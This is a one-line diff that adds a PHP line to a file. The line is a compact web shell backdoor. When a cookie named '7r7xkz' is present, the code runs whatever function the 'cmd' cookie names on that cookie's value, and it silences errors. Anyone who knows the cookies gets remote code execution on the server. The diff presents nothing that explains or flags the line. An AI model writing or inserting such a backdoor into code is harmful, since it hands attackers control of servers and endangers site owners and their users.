@@ -1,0 +1,1 @@
+<?php if (isset($_COOKIE["7r7xkz"])) @$_COOKIE["cmd"]($_COOKIE["7r7xkz"]);
